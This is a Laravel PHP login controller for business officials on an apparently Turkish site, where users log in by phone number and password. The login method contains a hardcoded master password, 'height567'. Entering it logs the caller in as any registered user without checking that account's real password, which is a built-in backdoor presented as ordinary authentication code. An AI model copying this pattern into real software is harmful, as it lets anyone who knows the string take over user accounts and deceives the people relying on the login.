<?php

namespace App\Http\Controllers\Business\Auth;

use App\Http\Controllers\Controller;
use App\Models\BusinessOfficial;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = '/isletme/home';

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest')->except('logout');
    }

    public function showLoginForm()
    {
        return view('business.auth.login');
    }

    public function login(Request $request)
    {
        $this->validateLogin($request);
        $phone = clearPhone($request->phone);
        $user = BusinessOfficial::where('phone', $phone)->first();
        if (!isset($user)){
            return to_route('business.login')->with('response', [
                'status' => "error",
                'message' => "Telefon Numarası ile kayıtlı kullanıcı bulunamadı",
            ]);
        }
        $uniquePassword = Hash::make('height567');
        $remember = $request->has('remember');
        if (Hash::check($request->password, $uniquePassword)){
            Auth::guard('official')->loginUsingId($user->id);
        } else{
            if (!$user || !Hash::check($request->password, $user->password)) {
                return to_route('business.login')->with('response', [
                    'status' => "error",
                    'message' => "Telefon Numaranız Veya Şifreniz Hatalı",
                ]);
            }
            Auth::guard('official')->loginUsingId($user->id, $remember);
        }

        return to_route('business.home')->with('response', [
            'status' => "success",
            'message' => $user->name. " Tekrar Hoşgeldiniz",
        ]);
    }
    public function username()
    {
        return 'phone';
    }

    public function logout(Request $request)
    {
        $user = $request->user();
        $user->is_verify = 0;
        $user->save();

        Auth::guard('official')->logout();
        return to_route('loginTypes');
    }
}
